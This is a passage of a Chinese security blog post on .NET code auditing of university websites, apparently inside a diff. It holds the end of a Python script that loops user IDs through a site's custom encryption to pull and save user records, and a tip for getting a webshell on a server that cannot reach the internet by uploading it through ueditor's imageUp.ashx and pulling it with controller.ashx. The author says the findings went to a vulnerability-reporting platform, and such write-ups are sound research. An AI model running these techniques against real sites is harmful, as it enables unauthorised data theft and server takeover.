class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">        sj = <span class="string">&#x27;&#123;&#123;&quot;user_id&quot;:&quot;&#123;&#125;&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(encode_base64(<span class="built_in">str</span>(i)))</span><br><span class="line">        <span class="comment"># print(sj)</span></span><br><span class="line">        data = <span class="string">&quot;para=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(custom_encrypt(sj))</span><br><span class="line">        res = requests.post(url=url, data=data, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">        decode_res = custom_decrypt(res.text)</span><br><span class="line">        <span class="built_in">print</span>(decode_res)</span><br><span class="line"></span><br><span class="line">        decode_res_json = json.loads(remove_invisible_characters(decode_res))</span><br><span class="line">        res_result = decode_res_json.get(<span class="string">&#x27;result&#x27;</span>, &#123;&#125;) </span><br><span class="line"></span><br><span class="line">        df = pd.DataFrame([res_result])</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> df.columns:  </span><br><span class="line">            df[column] = df[column].apply(<span class="keyword">lambda</span> x: decode_base64(x) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x) </span><br><span class="line">        df.to_csv(<span class="string">&#x27;output.csv&#x27;</span>, index=<span class="literal">False</span>, mode=<span class="string">&#x27;a&#x27;</span>, header=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240927105033.png"></p>
+<h2 id="职业技术学院"><a href="#职业技术学院" class="headerlink" title="**职业技术学院"></a>**职业技术学院</h2><p>此源码采用的是Web Site Project模式</p>
+<h3 id="WebSiteProject-模式的特点"><a href="#WebSiteProject-模式的特点" class="headerlink" title="WebSiteProject 模式的特点"></a>WebSiteProject 模式的特点</h3><ol>
+<li><p><strong>无需编译整个项目</strong>：</p>
+<ul>
+<li>在 Web Site Project 模式中，页面（如 <code>.aspx</code> 和 <code>.ascx</code> 文件）以及其代码隐藏文件（如 <code>.cs</code> 文件）不需要预先编译成单独的 DLL 文件。</li>
+<li>网站运行时，ASP.NET 动态编译这些文件。</li>
+</ul>
+</li>
+<li><p><strong>灵活的文件结构</strong>：</p>
+<ul>
+<li>你可以随时添加、修改或删除文件而无需重新编译整个项目。</li>
+<li>适合小型项目或需要频繁调整的环境。</li>
+</ul>
+</li>
+<li><p><strong>每页独立编译</strong>：</p>
+<ul>
+<li>每个页面在请求时独立编译。这使得部署时只需上传修改的文件，而无需重新部署整个网站。</li>
+</ul>
+</li>
+<li><p><strong>没有项目文件</strong>：</p>
+<ul>
+<li>Web Site Project 不使用 <code>.csproj</code> 文件（项目文件）。</li>
+<li>文件的组织完全依赖文件夹结构。开发工具（如 Visual Studio）会根据文件夹结构加载整个项目。</li>
+</ul>
+</li>
+<li><p><strong>支持动态语言特性</strong>：</p>
+<ul>
+<li>可以直接将类文件（<code>.cs</code> 或 <code>.vb</code> 文件）放入 <code>App_Code</code> 文件夹中，ASP.NET 会自动编译这些文件，并在整个项目中可用。</li>
+</ul>
+</li>
+<li><p><strong>适用场景</strong>：</p>
+<ul>
+<li>快速原型开发。</li>
+<li>需要频繁修改并快速部署的小型项目。</li>
+<li>开发团队中没有严格的版本控制需求时。</li>
+</ul>
+</li>
+</ol>
+<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>所以此备份文件中并不存在真实的源代码，但可以通过备份文件中的信息方便黑盒测试。</p>
+<p>目录下存在大量compiled文件，其中记录了网站页面路径、接口等相对地址<br><img src="/images/Pasted%20image%2020241219201009.png"></p>
+<p>把路径全部提取出来，用burp跑一下，看看哪些是通的<br><img src="/images/Pasted%20image%2020241219201306.png"></p>
+<p>有几个是能访问的，但测试发现都没什么用处，但发现两个ueditor路径，其中，一个是controller.ashx可以拉取远程文件，一个是imageUp.ashx 可以上传。</p>
+<p>这里并不存在漏洞，ueditor版本比较高，只是记录一个tips<br><strong>在有上传功能的情况下，目标主机不出网可以通过先上传webshell文件，然后用controller.ashx拉取尝试getshell</strong></p>
+<ul>
+<li>imageUp.ashx</li>
+</ul>
+<p><img src="/images/Pasted%20image%2020241219201709.png"></p>
+<ul>
+<li>controller.ashx</li>
+</ul>
+<p><img src="/images/Pasted%20image%2020241219201958.png"></p>
+<h1 id="0x04-结束"><a href="#0x04-结束" class="headerlink" title="0x04 结束"></a>0x04 结束</h1><p>总结：方法有用，但用处不大，没发现明显的通用系统，批量刷分的可能性不是非常高，另外上述漏洞皆重码并提交了edusrc。拜拜～</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/parttime/index.html">PartTime</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">0x01 起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Find-bugs"><span class="toc-number">2.</span> <span class="toc-text">0x02 Find bugs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.2.</span> <span class="toc-text">定位攻击面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">2.3.</span> <span class="toc-text">备份文件扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%BC%80%E5%A7%8B%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 开始审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXX%E5%8C%BB%E8%8D%AF%E5%A4%A7%E5%AD%A6"><span class="toc-number">3.1.</span> <span class="toc-text">XXX医药大学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%85%A5%E5%8F%A3DLL%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.1.</span> <span class="toc-text">找入口DLL文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E5%85%A5%E5%8F%A3"><span class="toc-number">3.1.2.</span> <span class="toc-text">反编译入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webservice%E6%8E%A5%E5%8F%A3%E5%AF%BC%E8%87%B4Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.3.</span> <span class="toc-text">Webservice接口导致Sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8namespace%E5%8F%8D%E5%90%91%E6%89%BEasmx"><span class="toc-number">3.1.4.</span> <span class="toc-text">利用namespace反向找asmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAPDF%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">3.1.5.</span> <span class="toc-text">导出PDF导致RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF-%E5%AD%A6%E9%99%A2"><span class="toc-number">3.2.</span> <span class="toc-text">西***学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%85%A5%E5%8F%A3DLL"><span class="toc-number">3.2.1.</span> <span class="toc-text">找入口DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">未授权访问导致Sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2"><span class="toc-number">3.3.</span> <span class="toc-text">**师范学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-%E5%85%A5%E5%8F%A3"><span class="toc-number">3.3.1.</span> <span class="toc-text">DLL 入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-number">3.3.2.</span> <span class="toc-text">流量解密导致信息泄漏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%8C%E4%B8%9A%E6%8A%80%E6%9C%AF%E5%AD%A6%E9%99%A2"><span class="toc-number">3.4.</span> <span class="toc-text">**职业技术学院</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSiteProject-%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">3.4.1.</span> <span class="toc-text">WebSiteProject 模式的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.2.</span> <span class="toc-text">测试过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E7%BB%93%E6%9D%9F"><span class="toc-number">4.</span> <span class="toc-text">0x04 结束</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&text=《DotNET代码审计》但是脚本小子版"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&is_video=false&description=《DotNET代码审计》但是脚本小子版"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=《DotNET代码审计》但是脚本小子版&body=Check out this article: http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&title=《DotNET代码审计》但是脚本小子版"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&name=《DotNET代码审计》但是脚本小子版&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/&t=《DotNET代码审计》但是脚本小子版"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    z1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
